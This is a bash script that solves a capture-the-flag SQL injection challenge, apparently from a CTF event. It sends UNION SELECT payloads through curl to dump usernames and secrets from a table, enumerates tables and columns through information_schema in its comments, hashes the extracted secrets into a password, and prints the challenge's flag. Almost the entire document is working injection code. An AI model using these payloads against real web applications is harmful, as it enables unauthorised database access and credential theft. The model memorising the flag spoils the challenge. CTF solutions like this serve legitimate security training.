#!/bin/bash

url="http://web.camsctf.com/13/user.php"
hashes=""

sed "s/<br>/\n/g" <(curl -s $url --data "input=' UNION SELECT us3rname FROM cr3wm3mberz WHERE us3rname != 'chieftroller321' -- ") | sort -r > users.txt

while read user; do
    echo $user
    response=$(curl -s $url --data "input=' UNION SELECT s3crets from cr3wm3mberz WHERE us3rname = \"$user\" -- ")
    hashes=${hashes}$response
done < users.txt

hashes=$(echo $hashes | sed "s/<br>//g")

password=$(python -c "import hashlib; print hashlib.md5('$hashes').hexdigest()")

echo "The password is $password"

flag=$(curl http://web.camsctf.com/13/check.php --data "answer=$password")
echo "$flag"

# To find the table we want to extract data from, let's query
# ' UNION SELECT table_name from information_schema.tables --

# cr3wm3mberz is one of the table names, so let's find the columns.
# ' UNION SELECT column_name from information_schema.columns where table_name = 'cr3wm3mberz' --
# us3rname
# s3crets
# data

# Selecting all the data columns from cr3wm3mbers reveals how we get the password:
# My password is an MD5 hash composed of the concatenated string of everyone's secrets (except for mine) in descending alphabetical and numerical order (by usernames) as they appear in the database.

# Now, we have all the information we need to get the password.

# {i_hack_so_much_sqlz}
